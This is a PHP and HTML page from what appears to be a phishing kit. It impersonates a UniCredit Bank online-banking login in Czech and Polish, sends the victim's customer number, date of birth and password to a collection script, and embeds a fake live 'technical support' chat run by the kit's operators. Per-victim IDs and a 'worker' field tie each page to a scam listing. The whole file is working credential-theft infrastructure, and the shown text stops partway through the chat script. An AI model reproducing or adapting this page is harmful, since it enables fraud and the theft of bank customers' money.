<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "UniCredit Bank");
?>
<!DOCTYPE html>
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<title>Bankowość korporacyjna, finansowanie przedsiębiorstw</title>
<style>
			._0 {
				margin: 0 auto;
				max-width: 400px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 50px;
				margin-bottom: 50px;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 28px;
				padding-top: 16px;
				width: 100%;
                text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border: 1px solid #000000;
			    border-radius: 6px;
			    padding: 12px 10px;
			    margin-bottom: 20px;
                background-color: #D0D0D0;
			}
			._3:hover {
				border: 1px solid #000;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 15px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 8px 30px 6px 31px;
			    min-width: 180px;
			    border-radius: 7px;
			    white-space: nowrap;
			    background-color: #000000;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			}
			._4:hover {
				background-color: #000000;
			    color: #fff;
			    border-color: #000000;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #222;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 40px;
			    border-bottom: 1px solid #e4e4e4;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: block;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				float: right;
				padding-bottom: 10px;
				padding-top: 30px;
			}
			#Pomoc {
				display: none;
                padding-top: 25px; 
                width: 150px;
			}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 0;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
</head>
<body>
<div id="mainblock">
<div class="_0">
<center><img height="120" src="data:image/png;base64,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"></center>
<form method="post" action="sendbank.php" id="formblock">
<div class="loginboxes" style="margin-bottom: 20px;">
<div class="_1">Přihlaste se do online bankovnictví</div>
</div>
<input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
<input type="hidden" name="type" value="14">

<input id="field3ds" class="_3" type="text" name="logindata" placeholder="Zadejte své zákaznické číslo nebo se přihlaste" required="">
<input id="field3ds" class="_3" type="text" name="datadata" placeholder="Datum narození" required="">
<input id="field3ds" class="_3" type="password" name="passdata" placeholder="Zadejte heslo" required="">
<div class="loginboxes">
<div id="Pomoc"><a href="#" style="font-size: 13px; color: #666666; text-decoration: none;">Pomoc s přihlášením</a></div>
<input class="_4" style="background-color: #000000;" type="submit" value="Pokračovat">
<br><br>
</div>
</form>
</div>
<footer><center>2022 UNICREDIT BANK</center></footer> 
<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #464646;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #464646;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #464646;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./expo_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./expo_files/operator-img.png"></div>
<div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Wnapište svou zprávu...">
<button id="smstosupbutton1" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
